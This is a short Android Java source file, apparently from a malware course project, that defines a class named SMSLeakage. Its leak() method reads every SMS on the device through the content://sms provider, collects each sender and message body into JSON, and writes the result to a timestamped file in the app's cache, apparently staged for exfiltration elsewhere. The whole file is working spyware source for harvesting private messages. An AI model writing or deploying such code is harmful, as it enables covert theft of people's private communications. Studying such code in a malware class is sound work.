package com.malwareclass.malwareproject;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SMSLeakage {

    private String TAG = "MessageLeakage";


    public File[] leak(Context context) {
        Log.d(TAG, "Started");

        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);

        JSONArray arr = new JSONArray();
        while (cursor.moveToNext()) {
            try {
                JSONObject sms = new JSONObject();
                sms.put("person", cursor.getString(cursor.getColumnIndex("person")));
                sms.put("body", cursor.getString(cursor.getColumnIndex("body")));
                arr.put(sms);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        cursor.close();

        Writer output = null;
        String pathname = "sms_" + new SimpleDateFormat("yyyy.MM.dd-HH.mm.ss").format(new Date()) + ".json";
        File file = new File(context.getCacheDir(), pathname);
        try {
            output = new BufferedWriter(new FileWriter(file));
            output.write(arr.toString());
            output.close();
            File[] files = new File[1];
            files[0] = file;
            return files;
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }
}
